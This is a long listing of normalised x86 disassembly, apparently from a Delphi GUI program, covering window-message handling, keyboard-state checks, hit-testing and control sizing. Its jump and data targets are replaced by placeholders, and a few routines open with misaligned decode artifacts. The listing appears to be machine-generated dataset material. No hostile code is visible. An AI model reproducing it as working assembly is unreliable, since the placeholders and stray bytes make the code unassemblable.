mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_439cc0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44f7bc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44f7bc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4385e0
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_458f68
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403454
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44f700
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403454
jmp r-xdata
sub_439e54
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408548
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408574
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_4385e0
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4083a0
call sub_40833c
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40833c
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_439efc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_439f2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_439ef0
push ebp
call sub_439efc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439f7c
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43a008
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43a040
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_439ac0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44f670
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403454
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44f670
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403454
sub_43a0c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4385b0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_438c78
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43a040
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43a110
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4385b0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43a12c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4385b0
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_438c78
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43a040
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403454
sub_43a184
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_439a60
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_4399f4
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_439a60
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_43a220
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43a040
pop esi
pop ebx
retn
sub_43a245
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43a040
pop esi
pop ebx
retn
sub_43a26b
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43a040
pop esi
pop ebx
retn
sub_43a295
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43a040
pop esi
pop ebx
retn
sub_43a2bb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43a2f0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_439ac0
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44f670
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403454
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44f670
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403454
sub_43a368
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43a3a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44f670
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403454
sub_43a3d8
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_438c78
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43a3a0
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_4068a0
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403454
sub_43a450
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_43a3a0
pop esi
pop ebx
retn
sub_43a470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_43a3a0
pop esi
pop ebx
retn
sub_43a490
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44f670
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403454
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_443ba0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a4e8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_438c68
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_438c78
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_439bf4
pop esi
retn
sub_43a528
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_439c28
sub_43a5d6
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_438e88
mov cl 0x1
sub_43a618
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_438be0
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_438be0
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_43a648
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_43a66c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_4068a0
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403454
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_439bf4
mov [ ebx + 0xc ] eax
sub_43a710
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_438b34
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_438b34
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_43a7a4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_4031a0
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_4381d4
mov edx [ esp ]
mov eax esi
call sub_4381b0
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_43845c
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_4384a0
sub_43a828
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_412350
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_438558
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_4123a0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_438400
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a8b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_43a7a4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43f228
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_43a828
pop ecx
jmp r-xdata
sub_43a914
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43aa02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa09
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_438a70
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_438a40
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_438a40
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40439c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_403fe4
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_438960
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_43aa10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403454
sub_43aa3c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aa5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aa7c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aa9c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aabc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aadc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43aafc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41959c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_438094
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403454
sub_43ab34
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43abd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413e34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_4453ac
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_4454e4
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_438a40
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_445244
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_445604
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43abd7
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_43abe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_43ac1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_43abe0
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_43accc
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
